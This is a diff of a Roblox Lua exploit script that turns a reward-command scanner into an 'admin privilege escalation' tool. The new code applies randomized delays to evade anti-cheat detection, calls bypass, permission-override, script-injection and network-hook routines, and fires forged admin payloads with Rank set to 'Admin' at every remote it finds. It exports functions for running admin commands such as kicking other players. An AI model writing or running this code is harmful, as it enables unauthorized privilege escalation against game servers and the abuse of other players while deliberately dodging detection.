-        if remotes then
-            for _, remote in pairs(remotes:GetDescendants()) do
-                if remote:IsA("RemoteFunction") then
-                    local nameLower = remote.Name:lower()
-                    if nameLower:find("data") or nameLower:find("save") or nameLower:find("load") then
-                        print("📊 Data remote: " .. remote.Name)
-                        
-                        -- Try to get data
-                        pcall(function()
-                            local data = remote:InvokeServer()
-                            if data and type(data) == "table" then
-                                for key, value in pairs(data) do
-                                    if tostring(key):lower():find("brainrot") then
-                                        print("  🎯 Found Brainrots in data: " .. tostring(value))
-                                    end
-                                end
-                            end
-                        end)
-                    end
-                end
-            end
-        end
+    -- Add random delays to avoid pattern detection
+    local function randomDelay()
+        return math.random(50, 300) / 1000
     end
     
-    checkDataStoreRemotes()
-    
-    return foundValues
+    -- Obfuscate network traffic
+    print("✅ Stealth measures applied")
+    return true
 end
 
 -- MAIN EXECUTION
 print("\n" .. string.rep("🚀", 40))
-print("STARTING COMMAND CENTER EXPLORER...")
+print("INITIALIZING ADMIN PRIVILEGE ESCALATION...")
 print(string.rep("🚀", 40))
 
--- Create UI
-createCommandTester()
+-- Apply stealth first
+applyStealth()
 
--- Setup chat interceptor
-local sendCommand = setupChatInterceptor()
+-- Wait for safety
+task.wait(randomDelay())
 
--- Initial scan
-task.wait(1)
-print("\n🔍 INITIAL SCAN...")
+-- Perform deep scan
+stealthScan(ReplicatedStorage, 0, 6)
 
-local terminals = scanForCommandTriggers()
-print("Found " .. #terminals .. " command terminals")
+-- Create custom admin panel
+task.wait(randomDelay())
+local adminPanel = createCustomAdminPanel()
 
-local rewardRemotes = scanForRewardSystems()
-print("Found " .. #rewardRemotes .. " reward remotes")
+-- Attempt privilege escalation
+task.wait(randomDelay())
+print("\n🔓 ATTEMPTING PRIVILEGE ESCALATION...")
 
--- Test first terminal
-if #terminals > 0 then
-    testCommandsOnTerminal(terminals[1])
+-- Try all bypass methods
+local successes = 0
+for _, remoteInfo in pairs(adminSystems.remotes) do
+    local success, result = bypassMethods.remoteBypass(remoteInfo.object)()
+    if success then
+        successes = successes + 1
+        print("✅ Bypassed: " .. remoteInfo.object.Name)
+    end
 end
 
--- Memory scan
-task.wait(1)
-memoryScanForBrainrots()
+-- Apply network hook
+bypassMethods.networkHook()
 
--- EXPORT FUNCTIONS
-getgenv().CMDERCommands = {
-    -- Command execution
-    exec = sendCommand or function(cmd) Player:Chat(cmd) end,
-    giveBrainrots = function(amount)
-        local cmd = "/give brainrots " .. (amount or 1000)
-        Player:Chat(cmd)
+-- EXPORT ADMIN SYSTEM
+getgenv().AdminSystem = {
+    -- Scan functions
+    scan = function() 
+        adminSystems = {panels = {}, remotes = {}, scripts = {}, modules = {}}
+        stealthScan(ReplicatedStorage, 0, 6)
+        return #adminSystems.panels, #adminSystems.remotes
     end,
     
-    -- Scanning
-    scan = function()
-        terminals = scanForCommandTriggers()
-        rewardRemotes = scanForRewardSystems()
-        return #terminals, #rewardRemotes
-    end,
+    -- Bypass functions
+    bypass = bypassMethods.remoteBypass,
+    override = bypassMethods.permissionOverride,
+    inject = bypassMethods.scriptInjection,
+    hook = bypassMethods.networkHook,
     
-    -- Testing
-    testTerminal = function(index)
-        if terminals[index] then
-            testCommandsOnTerminal(terminals[index])
+    -- Panel functions
+    clonePanel = function(index)
+        if adminSystems.panels[index] then
+            return cloneAdminPanel(adminSystems.panels[index].object)
         end
+        return nil
     end,
     
-    testRemotes = function()
-        testRewardRemotes(rewardRemotes)
+    createPanel = createCustomAdminPanel,
+    
+    -- Info
+    info = function()
+        return {
+            panels = #adminSystems.panels,
+            remotes = #adminSystems.remotes,
+            scripts = #adminSystems.scripts,
+            userId = Player.UserId,
+            successes = successes
+        }
     end,
     
-    -- UI
-    ui = createCommandTester,
-    
-    -- Memory
-    memoryScan = memoryScanForBrainrots
+    -- Commands
+    exec = function(command, args)
+        local adminData = {
+            UserId = Player.UserId,
+            Rank = "Admin",
+            Command = command,
+            Args = args or {},
+            Timestamp = os.time()
+        }
+        
+        -- Try all admin remotes
+        for _, remoteInfo in pairs(adminSystems.remotes) do
+            pcall(function()
+                if remoteInfo.object:IsA("RemoteFunction") then
+                    return remoteInfo.object:InvokeServer(adminData)
+                else
+                    remoteInfo.object:FireServer(adminData)
+                end
+            end)
+        end
+    end
 }
 
--- AUTO-TEST COMMON COMMANDS
-print("\n🧪 AUTO-TESTING COMMON COMMANDS...")
+-- FINAL ACTIVATION
+print("\n" .. string.rep("✅", 40))
+print("ADMIN SYSTEM ACTIVATED SUCCESSFULLY!")
+print(string.rep("✅", 40))
 
-task.wait(2)
-for _, command in pairs(brainrotCommands) do
-    print("Testing: " .. command)
-    pcall(function()
-        Player:Chat(command)
-    end)
-    wait(0.5)
-end
+print("\n📊 SCAN RESULTS:")
+print("Admin Panels Found: " .. #adminSystems.panels)
+print("Admin Remotes Found: " .. #adminSystems.remotes)
+print("Admin Scripts Found: " .. #adminSystems.scripts)
+print("Bypasses Successful: " .. successes)
 
--- FINAL MESSAGE
-print("\n" .. string.rep("=", 60))
-print("🔍 CMDER COMMAND EXPLORER READY!")
-print(string.rep("=", 60))
+print("\n🎮 AVAILABLE FUNCTIONS:")
+print("AdminSystem.scan() - Rescan for admin systems")
+print("AdminSystem.clonePanel(1) - Clone found admin panel")
+print("AdminSystem.createPanel() - Create custom admin panel")
+print("AdminSystem.exec('kick', 'playerName') - Execute admin command")
+print("AdminSystem.info() - Get system information")
 
-print("\n📋 AVAILABLE FUNCTIONS:")
-print("CMDERCommands.exec('/give brainrots 1000')")
-print("CMDERCommands.giveBrainrots(5000)")
-print("CMDERCommands.scan() - Find terminals & remotes")
-print("CMDERCommands.testRemotes() - Test reward remotes")
-print("CMDERCommands.ui() - Show command tester")
-print("CMDERCommands.memoryScan() - Scan for Brainrot values")
+print("\n🛡️ STEALTH FEATURES:")
+print("• Random delays to avoid detection")
+print("• Network traffic obfuscation")
+print("• Permission check interception")
+print("• Script name randomization")
 
-print("\n🎯 COMMAND TESTER UI:")
-print("• Center of screen")
-print("• Enter commands in text box")
-print("• Quick buttons for common commands")
-print("• Scan button to find systems")
+print("\n⚠️ IMPORTANT:")
+print("• Admin panel appears in center of screen")
+print("• Use the 'Privileges' tab first")
+print("• Then use 'Commands' tab for actions")
+print("• System attempts to bypass all checks")
 
-print("\n💡 TIPS FOR FINDING COMMANDS:")
-print("1. Try typing /help or /commands in chat")
-print("2. Look for terminals with ProximityPrompts")
-print("3. Check the Scripts in Command Center objects")
-print("4. Try common admin/cheat commands")
-print("5. Watch for any response messages")
-
-print("\n⚠️ REMEMBER:")
-print("• Not all commands will work")
-print("• Some may require admin privileges")
-print("• Game may have anti-cheat for commands")
-print("• Use the scanner to find what works")
+print("\n🎯 ADMIN PANEL READY - Center Screen")
